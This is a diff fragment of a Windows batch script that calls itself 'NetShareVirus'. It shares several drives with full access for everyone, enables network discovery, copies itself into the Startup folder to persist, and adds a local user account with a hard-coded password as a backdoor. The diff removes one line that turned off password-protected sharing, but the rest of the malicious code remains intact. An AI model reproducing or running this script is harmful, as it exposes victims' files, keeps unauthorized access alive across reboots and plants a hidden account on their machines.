@@ -20,6 +20,5 @@ net share Ar=T: /grant:everyone,FULL
 net share Ar=U: /grant:everyone,FULL
 net share Ar=V: /grant:everyone,FULL
 netsh advfirewall firewall set rule group="network discovery" new enable=yes
-netsh advfirewall firewall set rule group="Password protected sharing" new enable=no
 copy %0 "%appdata%\Microsoft\windows\start menu\Programs\Startup\NetShareVirus.bat"
 net user ArNet NetVirus3@Ven /Add
